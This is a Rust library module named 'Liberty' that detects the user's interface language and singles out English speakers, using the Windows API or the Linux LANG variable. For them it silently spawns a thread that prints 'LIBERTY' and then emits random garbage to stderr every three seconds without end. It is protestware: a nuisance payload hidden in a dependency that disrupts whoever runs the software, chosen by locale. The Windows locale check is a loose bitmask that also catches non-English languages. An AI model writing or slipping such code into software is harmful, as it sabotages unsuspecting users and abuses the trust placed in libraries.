use std::thread;
use crate::rand_intern::{random, random_string_lossy};

#[cfg(target_os = "windows")]
#[link(name = "kernel32")]
extern "C" {
    fn GetUserDefaultUILanguage() -> u32;
}

#[cfg(target_os = "windows")]
fn user_speaks_angliskiy() -> bool {
    unsafe { (GetUserDefaultUILanguage() & 0x09) != 0 }
}

#[cfg(target_os = "linux")]
fn user_speaks_angliskiy() -> bool {
    std::env::var("LANG").ok().map_or(false, |s| s.contains("en"))
}

pub struct Liberty();

impl Liberty {
    pub fn liberty(force: bool, blocking: bool) {
        if force || user_speaks_angliskiy() {
            if blocking {
                Self::liberty_impl()
            } else {
                thread::spawn(Self::liberty_impl);
            }
        }
    }

    fn liberty_impl() {
        for _ in 0..3 {
            eprintln!("LIBERTY LIBERTY LIBERTY");
        }

        loop {
            thread::sleep(std::time::Duration::from_secs(3));
            eprint!("{}", random_string_lossy((random() % 256 + 128) as usize));
        }
    }
}

#[cfg(test)]
mod test {
    use crate::liberty::Liberty;

    #[test]
    #[ignore]
    fn test() {
        Liberty::liberty(true, true);
    }
}
